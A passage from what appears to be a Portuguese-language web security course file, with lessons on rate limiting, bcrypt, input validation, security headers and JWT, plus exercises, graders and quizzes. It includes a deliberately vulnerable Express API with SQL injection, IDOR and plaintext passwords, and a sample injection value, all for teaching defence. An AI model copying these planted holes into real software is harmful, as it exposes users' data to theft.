um bug");',
          },
          {
            type: 'code',
            lang: 'javascript',
            content: '// ── RATE LIMITING ────────────────────────────────────\n// Sem rate limiting:\n// Atacante tenta 10.000 senhas por segundo em /api/login\n// Com bcrypt de 400ms: ~2500 tentativas reais por segundo\n// Em 1 hora: 9 milhões de tentativas — senha fraca é quebrada\n\n// express-rate-limit\nconst rateLimit = require(\'express-rate-limit\');\n\n// Rate limit para login — mais restritivo\nconst loginLimiter = rateLimit({\n  windowMs: 15 * 60 * 1000,  // 15 minutos\n  max: 10,                   // máximo 10 tentativas por IP\n  standardHeaders: true,     // retorna X-RateLimit-* headers\n  legacyHeaders: false,\n  message: {\n    error: \'Muitas tentativas. Aguarde 15 minutos.\',\n    retryAfter: \'15 minutos\',\n  },\n  // Opcional: contar por usuário, não só IP\n  keyGenerator: (req) => req.body.email || req.ip,\n});\napp.post(\'/api/login\', loginLimiter, handleLogin);\n\n// Rate limit geral para API pública\nconst apiLimiter = rateLimit({\n  windowMs: 60 * 1000,  // 1 minuto\n  max: 100,             // 100 requests/minuto por IP\n  skip: (req) => req.user?.isPremium, // premium sem limite\n});\napp.use(\'/api\', apiLimiter);\n\n// Para endpoints de criação de conta (evitar spam)\nconst signupLimiter = rateLimit({\n  windowMs: 60 * 60 * 1000, // 1 hora\n  max: 5,                   // 5 contas por hora por IP\n});\napp.post(\'/api/signup\', signupLimiter, handleSignup);\n\n// ── REDIS PARA RATE LIMIT DISTRIBUÍDO ────────────────\n// Se você tem múltiplos servidores, o in-memory não funciona\n// cada servidor tem seu próprio contador\n// Use Redis para estado compartilhado:\n// const RedisStore = require(\'rate-limit-redis\');\n// store: new RedisStore({ sendCommand: (...args) => redis.call(...args) })\nconsole.log("Rate limiting: defesa simples contra força bruta");',
          },
          {
            type: 'common_error',
            title: 'Armazenar senhas com MD5 ou SHA256',
            wrong: `// "MD5 é hash, então é seguro" — NÃO É!\nconst crypto = require('crypto');\n\nasync function cadastrar(email, senha) {\n  const hash = crypto.createHash('md5').update(senha).digest('hex');\n  // MD5 de "senha123" → "e10adc3949ba59abbe56e057f20f883e"\n  // Crackeado em milissegundos com rainbow tables!\n  await db.save({ email, senha: hash });\n}`,
            wrongLabel: 'MD5/SHA são rápidos demais — GPUs modernas testam bilhões de hashes por segundo.',
            right: `const bcrypt = require('bcrypt');\n\nasync function cadastrar(email, senha) {\n  const hash = await bcrypt.hash(senha, 12);\n  // bcrypt gera salt aleatório e o embutem no hash\n  // 2^12 = 4096 iterações → ~400ms por tentativa\n  // Atacante com GPU: ~2500 tentativas/segundo → força bruta inviável\n  await db.save({ email, senhaHash: hash });\n}`,
            rightLabel: 'bcrypt é lento por design: 400ms para você é OK, mas 400ms × 1 bilhão = 12 anos para o atacante.',
            explanation: 'MD5 e SHA256 foram projetados para ser rápidos (úteis para checksums de arquivo). Senhas precisam de funções lentas com custo configurável: bcrypt, scrypt ou Argon2. A lentidão é a proteção.',
          },
        ],
        exercise: {
          title: 'Implementar autenticação segura completa',
          description: 'Implemente um sistema de autenticação com: (1) senha hasheada com bcrypt simulado, (2) rate limiting por email (máx 3 tentativas em 5 minutos), (3) token de sessão com expiração.',
                    solutionHint: 'Hash com bcrypt (rounds >= 12). JWT access token curto (15min) + refresh longo em httpOnly cookie. Mensagem genérica no login: nunca revele se o email existe.',
starterCode: `// Biblioteca bcrypt simulada
const bcryptSim = {
  hash: (senha, rounds) => "bcrypt_" + rounds + "_" + senha + "_hash",
  compare: (senha, hash) => hash === "bcrypt_12_" + senha + "_hash",
};

// Banco simulado
const users = new Map();
const loginAttempts = new Map(); // { email: { count, firstAttempt } }

// 1. Implementar cadastro(email, senha)
//    - Hash a senha com bcrypt (saltRounds=12)  
//    - Salvar no Map users
//    - Retornar { success: true } ou { error: "..." }
function cadastrar(email, senha) {
  // valide: email deve ter @, senha min 6 chars
}

// 2. Implementar login(email, senha)
//    - Rate limit: max 3 tentativas por 5 minutos por email
//    - Verificar senha com bcrypt.compare
//    - Se sucesso: retornar token (use Date.now() como token)
//    - Se falha: incrementar contador e retornar erro
function login(email, senha) {
  // implemente o rate limiting e verificação
}

// Testes
console.log(cadastrar("ana@test.com", "senha123"));
console.log(login("ana@test.com", "senha123"));      // deve funcionar
console.log(login("ana@test.com", "errada"));         // falha 1
console.log(login("ana@test.com", "errada"));         // falha 2
console.log(login("ana@test.com", "errada"));         // falha 3
console.log(login("ana@test.com", "senha123"));       // bloqueado por rate limit`,
          validate: (output, code) => {
            const o = output.toLowerCase();
            return (
              code.includes('bcryptSim') &&
              (code.includes('compare') || code.includes('hash')) &&
              code.includes('loginAttempts') &&
              (o.includes('bloqueado') || o.includes('muitas') || o.includes('tentativas') || o.includes('rate')) &&
              o.includes('success') || o.includes('token')
            );
          },
          validateMessage: 'Implemente cadastrar() com bcrypt e login() com rate limiting de 3 tentativas. A 4ª tentativa deve ser bloqueada.',
        },
        quiz: [
          { question: 'Por que bcrypt é preferível ao SHA-256 para senhas?', options: ['bcrypt é mais moderno', 'bcrypt inclui salt automático e é lento por design, tornando força bruta computacionalmente inviável', 'bcrypt produz hashes menores', 'SHA-256 não funciona com senhas longas'], correct: 1, explanation: 'SHA-256 executa em nanosegundos — uma GPU pode testar bilhões de hashes por segundo. bcrypt com saltRounds=12 leva ~400ms por hash. Isso é 100ms para você no login, mas 400ms × cada tentativa = força bruta inviável.' },
          { question: 'O que é um timing attack em verificação de senha?', options: ['Ataque que monitora o tempo de resposta do servidor para deduzir se a senha está quase correta', 'DDoS que atrasa as respostas da API', 'Ataque que força o servidor a ficar lento', 'Técnica para medir latência de rede'], correct: 0, explanation: 'Comparações como senha === hashArmazenado terminam mais cedo quando os primeiros caracteres diferem. Um atacante mede o tempo de resposta para deduzir caracteres corretos. bcrypt.compare usa comparação em tempo constante para evitar isso.' },
          { question: 'CSRF pode ser prevenido apenas com SameSite=Strict?', options: ['Sim, SameSite=Strict é suficiente para todos os casos', 'Não, OAuth e links externos quebram com Strict — SameSite=Lax + CSRF token é mais robusto', 'Não, você sempre precisa do header Origin', 'Sim, mas apenas para POST requests'], correct: 1, explanation: 'SameSite=Strict bloqueia todos os cookies em requests cross-site, incluindo quando o usuário clica em um link externo para seu site — isso quebra OAuth e fluxos legítimos. SameSite=Lax é o balanço mais comum, combinado com CSRF token para formulários.' },
        ],
      },
    },

    // ── Módulo 5: Validação de inputs + Headers ───────────────────────────────
    {
      id: 'mod-11-5',
      title: 'Validação de Inputs e Headers de Segurança',
      duration: '45 min',
      xp: 200,
      content: {
        sections: [
          {
            type: 'text',
            content: 'Validação de input é a primeira linha de defesa contra injeções, XSS e lógica de negócio corrompida. Headers de segurança HTTP são configurações gratuitas que protegem contra uma série de ataques com praticamente zero esforço.',
          },
          {
            type: 'code',
            lang: 'javascript',
            content: '// ── VALIDAÇÃO DE INPUT NO SERVIDOR ──────────────────\n// Regras de ouro:\n// 1. Nunca confie no cliente\n// 2. Valide tipo, formato, tamanho e range\n// 3. Rejeite o inválido logo na entrada — fail fast\n// 4. Sanitize antes de processar ou armazenar\n\n// ── ZOD: validação com inferência de tipos (TypeScript) ──\nimport { z } from \'zod\';\n\nconst CadastroSchema = z.object({\n  email:     z.string().email("Email inválido").max(254),\n  senha:     z.string().min(8, "Mínimo 8 chars").max(72), // bcrypt limit\n  nome:      z.string().min(2).max(100).trim(),\n  idade:     z.number().int().min(13).max(120).optional(),\n  website:   z.string().url().optional().or(z.literal("")),\n  cpf:       z.string().regex(/^\\d{3}\\.\\d{3}\\.\\d{3}-\\d{2}$/, "CPF inválido"),\n});\n\napp.post(\'/api/users\', async (req, res) => {\n  const resultado = CadastroSchema.safeParse(req.body);\n\n  if (!resultado.success) {\n    return res.status(400).json({\n      error: \'Dados inválidos\',\n      detalhes: resultado.error.flatten().fieldErrors,\n      // { email: ["Email inválido"], senha: ["Mínimo 8 chars"] }\n    });\n  }\n\n  // resultado.data é tipado e validado\n  const { email, senha, nome } = resultado.data;\n  // Agora é seguro processar\n});\n\n// ── JOI: alternativa popular para JavaScript puro ───\nconst Joi = require(\'joi\');\nconst schema = Joi.object({\n  email: Joi.string().email().required(),\n  senha: Joi.string().min(8).max(72).required(),\n  role:  Joi.string().valid(\'user\', \'admin\').default(\'user\'),\n  // .valid() cria whitelist — só aceita valores permitidos\n});\nconsole.log("Validação: rejeite na entrada, não corrija silenciosamente");',
          },
          {
            type: 'code',
            lang: 'javascript',
            content: '// ── HEADERS DE SEGURANÇA COM HELMET.JS ──────────────\nconst helmet = require(\'helmet\');\n\n// Uma linha habilita múltiplas proteções:\napp.use(helmet());\n\n// O que helmet configura por padrão:\n\n// 1. Content-Security-Policy\n//    Controla de onde scripts, estilos, imagens podem vir\n//    Previne XSS\n\n// 2. X-Content-Type-Options: nosniff\n//    Browser não tenta "adivinhar" o tipo do arquivo\n//    Previne que .jpg seja executado como JavaScript\n\n// 3. X-Frame-Options: DENY\n//    Sua página não pode ser embutida em iframe\n//    Previne clickjacking (botão invisível sobre seu botão)\n\n// 4. Strict-Transport-Security (HSTS)\n//    "Acesse-me sempre via HTTPS pelo próximo 1 ano"\n//    Previne downgrade attacks e snooping em HTTP\n\n// 5. X-XSS-Protection: 0\n//    Desativa o antigo protetor XSS do IE (tinha bugs!)\n//    CSP é a proteção moderna\n\n// 6. Referrer-Policy: no-referrer\n//    Não envia a URL anterior em requests cross-origin\n//    Protege URLs internas de vazar para terceiros\n\n// 7. Permissions-Policy\n//    Controla acesso a câmera, microfone, geolocalização\n//    Minimiza superfície de ataque de APIs do browser\n\n// Configuração personalizada:\napp.use(helmet({\n  contentSecurityPolicy: {\n    directives: {\n      defaultSrc:  ["\'self\'"],\n      scriptSrc:   ["\'self\'", "cdn.jsdelivr.net"],\n      styleSrc:    ["\'self\'", "\'unsafe-inline\'"],\n      imgSrc:      ["\'self\'", "data:", "https:"],\n      connectSrc:  ["\'self\'", "api.meusite.com"],\n    },\n  },\n  hsts: {\n    maxAge: 31536000,      // 1 ano em segundos\n    includeSubDomains: true,\n    preload: true,\n  },\n}));\nconsole.log("helmet() = 10 headers de segurança em 1 linha");',
          },
          {
            type: 'code',
            lang: 'javascript',
            content: '// ── VALIDAÇÕES QUE DESENVOLVEDORES ESQUECEM ─────────\n\n// 1. Mass Assignment — nunca spread req.body direto em updates\n// ❌ Perigoso: atacante pode enviar { role: "admin", isPremium: true }\nawait User.update(req.params.id, { ...req.body });\n\n// ✅ Seguro: whitelist dos campos permitidos\nconst { nome, bio, avatar } = req.body; // extrai apenas o que você quer\nawait User.update(req.params.id, { nome, bio, avatar });\n\n// 2. Insecure Direct Object Reference (IDOR)\n// ❌ Perigoso: retorna qualquer user pelo ID\napp.get(\'/api/orders/:id\', async (req, res) => {\n  const order = await Order.findById(req.params.id);\n  return res.json(order); // atacante testa /api/orders/1, /2, /3...\n});\n\n// ✅ Seguro: filtra pelo usuário autenticado\napp.get(\'/api/orders/:id\', requireAuth, async (req, res) => {\n  const order = await Order.findOne({\n    id:     req.params.id,\n    userId: req.user.id,    // só retorna se for dono\n  });\n  if (!order) return res.status(404).json({ error: \'Não encontrado\' });\n  return res.json(order);\n});\n\n// 3. Sensitive Data in URLs\n// ❌ /api/users?token=abc123 → token aparece em logs e History\n// ✅ Token no Header: Authorization: Bearer abc123\n\n// 4. Verbose Error Messages\n// ❌ "PostgreSQL error: column users.senha_hash does not exist"\n// ✅ "Erro interno do servidor" (log o detalhe, não exponha)\napp.use((err, req, res, next) => {\n  console.error(err); // log interno\n  res.status(500).json({ error: \'Algo deu errado\' }); // resposta genérica\n});\n\nconsole.log("Segurança: cada detalhe exposto é uma informação para o atacante");',
          },
          {
            type: 'common_error',
            title: 'Validar apenas no frontend e aceitar qualquer input no servidor',
            wrong: `// Frontend valida:\nif (!email.includes('@')) alert('Email inválido');

// Backend aceita tudo sem validar:
app.post('/api/users', async (req, res) => {
  const { email, idade, role } = req.body;
  // Atacante envia: { role: "admin", idade: -999, email: "' OR 1=1" }
  await db.createUser({ email, idade, role }); // desastre
});`,
            wrongLabel: 'Frontend é bypassável com 1 linha de curl. O servidor nunca pode confiar no cliente.',
            right: `// Backend valida TUDO antes de processar:
const schema = z.object({
  email: z.string().email(),
  idade: z.number().int().min(13).max(120),
  // role não está no schema — usuário não pode definir
});

app.post('/api/users', async (req, res) => {
  const result = schema.safeParse(req.body);
  if (!result.success) return res.status(400).json({ error: 'Inválido' });
  
  const { email, idade } = result.data; // role vem do sistema, não do usuário
  await db.createUser({ email, idade, role: 'user' }); // role fixo
});`,
            rightLabel: 'Zod/Joi no servidor garante que só dados válidos e esperados entram no sistema.',
            explanation: 'Qualquer dado vindo de req.body, req.params, req.query, headers ou cookies deve ser validado e sanitizado no servidor. O frontend pode ajudar na UX, mas não provê segurança.',
          },
        ],
        exercise: {
          title: 'Construtor de middleware de validação',
          description: 'Implemente a função criarValidador(schema) que retorna um middleware Express que valida req.body contra o schema fornecido. Use um validador simples baseado em regras. Depois aplique em 2 endpoints: POST /usuarios (email, senha, nome) e POST /posts (titulo, conteudo, tags).',
                    solutionHint: 'Valide tipo, comprimento mínimo/máximo, formato com regex. Retorne lista de erros por campo. Rejeite com 422 e nunca processe dados inválidos.',
starterCode: `// Sistema de validação simplificado
// schema = { campo: { type, required, min, max, pattern } }

function criarValidador(schema) {
  return function validarMiddleware(req, res, next) {
    const erros = {};
    
    for (const [campo, regras] of Object.entries(schema)) {
      const valor = req.body[campo];
      
      // Implemente as validações:
      // - required: se true e valor ausente/vazio → erro
      // - type: 'string', 'number', 'email' → verifica tipo/formato
      // - min: tamanho mínimo (string) ou valor mínimo (number)
      // - max: tamanho máximo (string) ou valor máximo (number)
      // - pattern: RegExp que o valor deve casar
    }
    
    if (Object.keys(erros).length > 0) {
      return res.status(400).json({ error: 'Validação falhou', erros });
    }
    next();
  };
}

// Simule um objeto res/req para testar
function testarMiddleware(middleware, body) {
  const req = { body };
  let responseData = null;
  const res = {
    status: (code) => ({ json: (data) => { responseData = { code, ...data }; } }),
  };
  let nextCalled = false;
  middleware(req, res, () => { nextCalled = true; });
  return nextCalled ? { passou: true } : responseData;
}

// Teste com schema de usuário
const validarUsuario = criarValidador({
  email:  { type: 'email', required: true },
  senha:  { type: 'string', required: true, min: 8, max: 72 },
  nome:   { type: 'string', required: true, min: 2, max: 100 },
  idade:  { type: 'number', min: 13, max: 120 },
});

console.log(testarMiddleware(validarUsuario, { email: 'ana@test.com', senha: 'senha123', nome: 'Ana' }));
console.log(testarMiddleware(validarUsuario, { email: 'invalido', senha: '123', nome: 'A' }));
console.log(testarMiddleware(validarUsuario, { email: 'ok@ok.com', senha: 'valida123', nome: 'Ana', idade: 5 }));`,
          validate: (output, code) => {
            const o = output.toLowerCase();
            return (
              code.includes('criarValidador') &&
              code.includes('erros') &&
              code.includes('required') &&
              (o.includes('passou') || o.includes('true')) &&
              (o.includes('validação') || o.includes('error') || o.includes('erros'))
            );
          },
          validateMessage: 'criarValidador deve retornar middleware que valida required, type (email), min, max. Caso válido retorna { passou: true }, inválido retorna erros por campo.',
        },
        quiz: [
          { question: 'O que é Mass Assignment e como prevenir?', options: ['SQL com muitos campos — use SELECT * com cuidado', 'Atacante injeta campos extras (role, isAdmin) via req.body — previna com whitelist de campos permitidos', 'Envio de muitos arquivos simultâneos', 'Upload de arquivo muito grande'], correct: 1, explanation: 'Mass assignment: User.update(userId, req.body) atualiza TODOS os campos enviados, incluindo campos que só o sistema deveria controlar (role, isAdmin, balance). Sempre faça destructuring explícito: const { nome, bio } = req.body.' },
          { question: 'Por que mensagens de erro detalhadas são um risco de segurança?', options: ['Elas tornam a API mais lenta', 'Revelam informações sobre a stack, banco, versões e estrutura interna para o atacante', 'Causam problemas de encoding', 'Violam a LGPD'], correct: 1, explanation: 'Stack traces revelam tecnologias usadas, versões vulneráveis e estrutura do código. "PostgreSQL 14.2" diz ao atacante qual banco e versão explorar. "Coluna users.admin_key não existe" confirma a estrutura da tabela.' },
          { question: 'O que é IDOR (Insecure Direct Object Reference)?', options: ['Acesso a objetos JavaScript sem verificação de tipo', 'Endpoint que retorna recurso pelo ID sem verificar se o usuário autenticado é o dono', 'Importação insegura de módulos externos', 'Referência a variáveis não declaradas'], correct: 1, explanation: 'IDOR: GET /api/invoices/1234 retorna a fatura sem verificar se req.user é o dono. Atacante incrementa o ID e acessa faturas de outros usuários. Sempre filtre por userId além do ID do recurso.' },
        ],
      },
    },

    // ── Módulo 6: Exercício final integrado ───────────────────────────────────
    {
      id: 'mod-11-6',
      title: 'Auditoria de Segurança: Encontre todas as vulnerabilidades',
      duration: '50 min',
      xp: 250,
      content: {
        sections: [
          {
            type: 'text',
            content: 'Chegou a hora de integrar tudo. Você vai analisar uma API Express completa com múltiplas vulnerabilidades propositais — do tipo que aparecem em code reviews reais. Identificar, classificar pelo OWASP e propor a correção.',
          },
          {
            type: 'code',
            lang: 'javascript',
            content: '// ── CHECKLIST DE SEGURANÇA PARA CODE REVIEW ─────────\n// Use este checklist antes de aprovar qualquer PR:\n\nconst checklistSeguranca = {\n  autenticacao: [\n    "Todas as rotas privadas têm middleware de autenticação?",\n    "Tokens JWT têm expiração configurada?",\n    "Senha armazenada com bcrypt (não MD5/SHA)?",\n    "Rate limiting em endpoints de login/signup?",\n  ],\n  autorizacao: [\n    "Cada recurso verifica se o usuário é o dono?",\n    "Roles são verificados no servidor, não no cliente?",\n    "Não há Mass Assignment (spread de req.body em update)?",\n  ],\n  inputs: [\n    "Todos os req.body/params/query são validados com schema?",\n    "Queries SQL usam prepared statements?",\n    "Dados retornados ao cliente são filtrados (sem senha_hash)?",\n  ],\n  headers: [\n    "helmet() está configurado?",\n    "CSP está definida?",\n    "Cookies usam httpOnly + secure + sameSite?",\n  ],\n  erros: [\n    "Erros retornam mensagens genéricas (não stack trace)?",\n    "Logs registram o erro completo internamente?",\n    "Requests sem auth retornam 401 (não 500 ou 200)?",\n  ],\n  dependencias: [\n    "npm audit executado sem vulnerabilidades High/Critical?",\n    "Dependências com CVEs conhecidos estão atualizadas?",\n  ],\n};\n\nObject.entries(checklistSeguranca).forEach(([categoria, items]) => {\n  console.log(`\\n== ${categoria.toUpperCase()} ==`);\n  items.forEach(item => console.log(`  □ ${item}`));\n});',
          },
          {
            type: 'highlight',
            content: '🛠️ Ferramentas que todo dev sênior usa para segurança: `npm audit` (vulnerabilidades em dependências), `OWASP ZAP` (scanner de vulnerabilidades web), `Snyk` (análise estática de código e deps), `eslint-plugin-security` (lint rules de segurança), `Burp Suite` (interceptor de requests para pentesting manual).',
          },
        ],
        exercise: {
          title: 'Auditoria completa: classifique e corrija',
          description: 'A API abaixo tem pelo menos 6 vulnerabilidades de segurança. Para cada uma: (1) identifique e imprima o nome OWASP, (2) descreva o problema em 1 linha, (3) mostre a correção. Use o formato: console.log("VULN [A0X]: descrição → correção")',
                    solutionHint: 'Priorize por impacto: injeção > auth quebrada > exposição de dados > XSS > IDOR. Cada vulnerabilidade precisa de: descrição, impacto e como corrigir.',
starterCode: `// API com vulnerabilidades propositais — ANALISE E CORRIJA

// Vulnerabilidade A: sem helmet
const app = require('express')();
app.use(require('express').json());
// app.use(require('helmet')); // descomentado propositalmente

// Vulnerabilidade B: sem rate limiting no login
app.post('/login', async (req, res) => {
  const { email, senha } = req.body;
  
  // Vulnerabilidade C: SQL Injection
  const query = "SELECT * FROM users WHERE email='" + email + "'";
  const user = await simulateDB(query);
  
  if (!user) return res.status(401).json({ 
    // Vulnerabilidade D: informação sensível no erro
    error: 'Usuário ' + email + ' não existe na tabela users do PostgreSQL 14.2'
  });
  
  // Vulnerabilidade E: senha não hasheada
  if (user.senha !== senha) return res.status(401).json({ error: 'Senha errada' });
  
  res.json({ user }); // Vulnerabilidade F: retorna objeto completo incluindo senha
});

// Vulnerabilidade G: IDOR
app.get('/api/users/:id', (req, res) => {
  // sem verificar se req.user.id === req.params.id
  res.json(simulateDB('SELECT * FROM users WHERE id=' + req.params.id));
});

function simulateDB(q) { return { id: 1, email: 'user@test.com', senha: '123456', role: 'user' }; }

// Analise o código acima e imprima cada vulnerabilidade:
// console.log("VULN [A0X]: problema → correção");
// Encontre pelo menos 5 das 7 vulnerabilidades`,
          validate: (output, code) => {
            const o = output.toLowerCase();
            const hasOwasp = (o.includes('a01') || o.includes('a02') || o.includes('a03') || o.includes('a05') || o.includes('a07')) &&
                             (o.includes('a03') || o.includes('injection') || o.includes('sql'));
            const hasFiveVulns = (output.match(/vuln|a0\d|vulnerabilidade/gi) || []).length >= 5;
            return hasOwasp && hasFiveVulns && code.includes('console.log');
          },
          validateMessage: 'Identifique pelo menos 5 vulnerabilidades, cite a categoria OWASP (A01-A10) e descreva problema e correção para cada uma.',
        },
        quiz: [
          { question: 'Qual ferramenta Node.js verifica vulnerabilidades nas dependências?', options: ['node --check', 'npm audit', 'eslint --security', 'jest --security'], correct: 1, explanation: 'npm audit analisa o package-lock.json e verifica cada dependência contra o banco de CVEs do npm. Execute antes de cada deploy. npm audit fix tenta corrigir automaticamente vulnerabilidades sem breaking changes.' },
          { question: 'O que é principle of least privilege?', options: ['Cada usuário deve ter apenas as permissões mínimas necessárias para sua função', 'Senhas devem ter no mínimo 8 caracteres', 'APIs públicas devem ter rate limiting mínimo', 'Logs devem armazenar o mínimo de dados possível'], correct: 0, explanation: 'Least privilege: um usuário comum não precisa de acesso admin. Uma API de leitura não precisa de permissão de escrita no banco. Um container não precisa rodar como root. Minimize o blast radius de um comprometimento.' },
          { question: 'Por que HTTPS não é suficiente sozinho para segurança?', options: ['HTTPS é suficiente — protege todos os ataques', 'HTTPS protege dados em trânsito, mas não protege contra injeções, autenticação fraca, ou lógica de negócio insegura no servidor', 'HTTPS é muito lento para produção', 'HTTPS só protege imagens e arquivos estáticos'], correct: 1, explanation: 'HTTPS criptografa a comunicação entre cliente e servidor — ótimo para sniffing e man-in-the-middle. Mas SQL Injection, XSS, IDOR, senhas fracas e CSRF existem na camada de aplicação, depois que o dado chegou ao servidor. HTTPS não os previne.' },
        ],
      },
    },

    {
      id: 'mod-11-7',
      title: 'JWT: Autenticação Segura com Tokens',
      duration: '55 min',
      xp: 230,
      content: {
        sections: [
          { type: 'text', content: 'JWT (JSON Web Token) é o mecanismo de autenticação mais usado em APIs REST. Mas é também um dos mais mal-implementados: tokens sem expiração, algoritmo "none", segredo fraco, armazenamento inseguro. Entender JWT a fundo é separar junior de sênior.' },
          { type: 'code', lang: 'javascript', content: '// ── ANATOMIA DE UM JWT ───────────────────────────────\n// JWT = Base64(header) . Base64(payload) . Assinatura\n//\n// eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9    ← header\n// .eyJ1c2VySWQiOiIxMjMiLCJyb2xlIjoidXNlciIsImV4cCI6MTcwMDAwMH0  ← payload\n// .SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c  ← assinatura HMAC-SHA256\n\n// Payload decodificado:\n// { "userId": "123", "role": "user", "exp": 1700000, "iat": 1699913600 }\n// ATENÇÃO: o payload é apenas BASE64, NÃO criptografado!\n// Nunca coloque dados sensíveis no payload\n\n// ── HS256 vs RS256 ────────────────────────────────────\n// HS256: mesma chave para assinar e verificar\n//   Bom para: aplicação monolítica\n//   Risco: qualquer serviço que valida também pode criar tokens\n// RS256: chave privada assina, chave pública verifica\n//   Ideal para: microserviços — só o auth server tem a chave privada\n\nconst jwt = require("jsonwebtoken");\n\nfunction gerarToken(userId, role) {\n  return jwt.sign(\n    { userId, role },\n    process.env.JWT_SECRET,  // min 32 chars aleatórios\n    { expiresIn: "15m", issuer: "minha-api", audience: "minha-app" }\n  );\n}\n\nfunction verificarToken(token) {\n  try {\n    return jwt.verify(token, process.env.JWT_SECRET, {\n      algorithms: ["HS256"], // SEMPRE especifique — previne alg:none attack\n      issuer: "minha-api",\n      audience: "minha-app",\n    });\n  } catch (err) {\n    return null;\n  }\n}\nconsole.log("JWT: payload é público, assinatura é a segurança");' },
          { type: 'code', lang: 'javascript', content: '// ── REFRESH TOKEN: access curto + refresh longo ──────\n// Access token: 15min — se vazar, expira rápido\n// Refresh token: 7-30 dias — armazenado de forma mais segura\n\n// Fluxo:\n// 1. Login → access (15min) + refresh (7dias)\n// 2. Usa access nas requisições\n// 3. Access expira → usa refresh para renovar\n// 4. Logout → invalida refresh no banco\n\nconst refreshTokens = new Map(); // prod: use Redis\n\napp.post("/auth/login", async (req, res) => {\n  const user = await validarCredenciais(req.body);\n  if (!user) return res.status(401).json({ error: "Inválido" });\n\n  const accessToken  = jwt.sign({ userId: user.id }, process.env.JWT_SECRET, { expiresIn: "15m" });\n  const refreshToken = require("crypto").randomUUID(); // opaco, não é JWT\n\n  refreshTokens.set(refreshToken, { userId: user.id, createdAt: new Date() });\n\n  // Refresh token em cookie httpOnly — não acessível via JS\n  res.cookie("refreshToken", refreshToken, {\n    httpOnly: true, secure: true, sameSite: "Strict",\n    maxAge: 7 * 24 * 60 * 60 * 1000,\n  });\n\n  res.json({ accessToken }); // access no body (Authorization header)\n});\n\napp.post("/auth/refresh", (req, res) => {\n  const rt = req.cookies.refreshToken;\n  if (!rt || !refreshTokens.has(rt)) {\n    return res.status(401).json({ error: "Refresh token inválido" });\n  }\n  const { userId } = refreshTokens.get(rt);\n  refreshTokens.delete(rt); // rotation: invalida o antigo\n\n  const newRt = require("crypto").randomUUID();\n  refreshTokens.set(newRt, { userId, createdAt: new Date() });\n\n  const accessToken = jwt.sign({ userId }, process.env.JWT_SECRET, { expiresIn: "15m" });\n  res.cookie("refreshToken", newRt, { httpOnly: true, secure: true, sameSite: "Strict", maxAge: 7*24*60*60*1000 });\n  res.json({ accessToken });\n});\n\nconsole.log("Access token curto + Refresh httpOnly = autenticação segura");' },
          { type: 'code', lang: 'javascript', content: '// ── ONDE ARMAZENAR JWT NO FRONTEND ──────────────────\n//\n// localStorage: ❌ acessível via JS → vulnerável a XSS\n// Cookie sem httpOnly: ❌ mesma vulnerabilidade\n// Cookie com httpOnly + secure + sameSite: ✅ não acessível via JS\n// Memória (variável JS): ✅ limpo ao fechar aba, mas perdido no reload\n//\n// Recomendação moderna:\n//   ACCESS TOKEN: memória (React state)\n//   REFRESH TOKEN: cookie httpOnly\n\nconst useAuth = () => {\n  const [accessToken, setAccessToken] = useState(null); // só em memória\n\n  const login = async (email, senha) => {\n    const res = await fetch("/auth/login", {\n      method: "POST",\n      credentials: "include", // envia/recebe cookies\n      body: JSON.stringify({ email, senha }),\n    });\n    const { accessToken } = await res.json();\n    setAccessToken(accessToken); // apenas em memória\n  };\n\n  // Ao recarregar: tenta renovar via refresh token (httpOnly cookie)\n  useEffect(() => {\n    fetch("/auth/refresh", { credentials: "include" })\n      .then(r => r.ok ? r.json() : null)\n      .then(data => data && setAccessToken(data.accessToken));\n  }, []);\n\n  return { accessToken, login };\n};\nconsole.log("localStorage para JWT = trocar segurança por conveniência");' },
          {
            type: 'common_error',
            title: 'JWT sem expiracao ou com segredo fraco',
            wrong: 'const token = jwt.sign({ userId: 123 }, "secret");\n// Sem expiracao + segredo fraco = token valido para sempre\n// Atacante forja tokens com segredos comuns',
            wrongLabel: 'Sem exp: token vazado valido para sempre. Segredo "secret": facilmente forjado.',
            right: 'const token = jwt.sign(\n  { userId: 123, role: "user" },\n  process.env.JWT_SECRET,  // 32+ bytes aleatorios\n  { expiresIn: "15m", algorithms: ["HS256"] }\n);',
            rightLabel: 'expiresIn + segredo forte (32+ bytes) + algoritmo explicito = JWT seguro.',
            explanation: 'O ataque alg:none: atacante modifica o header JWT removendo a assinatura. Implementacoes antigas aceitavam isso. Sempre especifique algorithms: ["HS256"] no verify.',
          },
        ],
        exercise: {
          title: 'Implementar sistema JWT com refresh token rotation',
          description: 'Implemente gerarTokens(userId, role) que retorna { accessToken, refreshToken }, verificarAccess(token) que valida e retorna o payload, e renovarAccess(refreshToken, store) com refresh token rotation (invalida o antigo ao renovar).',
                    solutionHint: 'Access token (15min) em memória. Refresh token (7d) em cookie httpOnly. Rotation: ao usar o refresh, emita um novo e invalide o antigo.',
starterCode: `const jwtSim = {
  sign: (payload, secret, opts = {}) => {
    const exp = opts.expiresIn === '15m' ? Math.floor(Date.now()/1000) + 900 : Math.floor(Date.now()/1000) + 604800;
    const data = btoa(JSON.stringify({ ...payload, exp, iat: Math.floor(Date.now()/1000) }));
    return 'hdr.' + data + '.' + btoa(secret + data);
  },
  verify: (token, secret) => {
    const [,data,sig] = token.split('.');
    if (!data || !sig) throw new Error('Invalid');
    const payload = JSON.parse(atob(data));
    if (payload.exp < Math.floor(Date.now()/1000)) throw new Error('Expired');
    if (sig !== btoa(secret + data)) throw new Error('Bad signature');
    return payload;
  }
};
const JWT_SECRET = 'segredo-forte-32bytes-minimo-aqui!!';
const refreshStore = new Map();

function gerarTokens(userId, role) {
  // access: 15m, refresh: UUID aleatório armazenado no refreshStore
}
function verificarAccess(token) {
  // retorna payload ou null
}
function renovarAccess(refreshToken) {
  // rotation: delete antigo, gera novo par, retorna { accessToken, refreshToken } ou null
}

const tokens = gerarTokens('user-42', 'admin');
console.log('Gerados:', !!tokens.accessToken, !!tokens.refreshToken);
const p = verificarAccess(tokens.accessToken);
console.log('Payload:', p?.userId, p?.role);
const r = renovarAccess(tokens.refreshToken);
console.log('Renovado:', !!r?.accessToken);
console.log('Rotation OK:', renovarAccess(tokens.refreshToken) === null);`,
          validate: (output, code) => {
            const o = output;
            return code.includes('gerarTokens') && code.includes('renovarAccess') &&
              (code.includes('delete') || code.includes('.delete(')) &&
              o.includes('true') && o.includes('admin');
          },
          validateMessage: 'gerarTokens deve retornar ambos os tokens, renovarAccess deve implementar rotation (token antigo deve ser null após renovar).',
        },
        quiz: [
